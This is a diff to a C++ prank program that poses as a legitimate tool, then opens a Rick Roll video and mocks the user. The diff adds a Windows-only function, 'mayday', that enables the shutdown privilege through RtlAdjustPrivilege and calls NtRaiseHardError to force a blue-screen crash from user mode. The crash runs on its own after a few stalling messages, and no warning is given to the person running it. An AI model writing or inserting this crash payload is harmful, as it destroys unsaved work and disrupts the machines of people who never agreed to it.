@@ -4,6 +4,7 @@
 #ifdef _WIN32
 	#include <windows.h>
 	#include <shellapi.h>
+	#include <winternl.h>
 #endif
 #ifdef __linux__
     #include <cstring>
@@ -17,6 +18,9 @@ void __sleep(unsigned int ms);
 void __clear();
 void typingPrint(const char* item);
 void openRickRoll();
+#ifdef _WIN32
+	void mayday();
+#endif
 
 int main() {
 	prePhase();
@@ -71,11 +75,20 @@ void postPhase() {
 	std::cout << "[!] Finalizing..."; __sleep(3000);
 }
 
-// clears the screen and makes fun of the dumbass who believed this
+// clears the screen and makes fun of the dumbass who believed this - and maybe crashes the user
 void endPhase() {
 	__clear();
-	openRickRoll();
-	std::cout << trolled << std::endl; std::cout << "Now get out of here... "; getchar();
+	openRickRoll();                                                                  
+	std::cout << trolled << std::endl;
+	#ifdef _WIN32
+		std::cout << "But wait... there's more!" << std::endl;
+		__sleep(5000); std::cout << "Just a few more seconds..." << std::endl; 
+		__sleep(5000); std::cout << "Wait, wait, please just wait a minute, okay? Jesus." << std::endl;
+		mayday(); std::cout << "Or maybe not... nevermind... bye."; getchar(); // just in case setting privs fails
+	#endif
+	#ifdef __linux__
+		std::cout << "Now get out of here, nerd." << std::endl; getchar();
+	#endif
 }
 
 // platform dependent thread sleep
@@ -98,7 +111,7 @@ void __clear() {
 	#endif
 }
 
-// to miniy for statements
+// to minify for statements
 void typingPrint(const char* item) {
 	for (unsigned short int i = 0; i < strlen(item); i++) {
 		std::cout << item[i];
@@ -115,3 +128,21 @@ void openRickRoll() {
 		system("xdg-open https://youtu.be/dQw4w9WgXcQ?autoplay=1");
 	#endif
 }
+
+// crashes machine from user-mode
+#ifdef _WIN32
+	void mayday() {
+		// function pointers to hold addresses to necessary functions
+		typedef NTSTATUS(WINAPI *fn_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+		typedef NTSTATUS(WINAPI *fn_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
+
+		BOOLEAN bEnabled; ULONG uResp;
+		LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+		LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+		fn_RtlAdjustPrivilege adjust = (fn_RtlAdjustPrivilege)lpFuncAddress;
+		fn_NtRaiseHardError cBSOD = (fn_NtRaiseHardError)lpFuncAddress2;
+		NTSTATUS NtRet = adjust(19, TRUE, FALSE, &bEnabled);
+		__sleep(15000);
+		cBSOD(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
+	}
+#endif
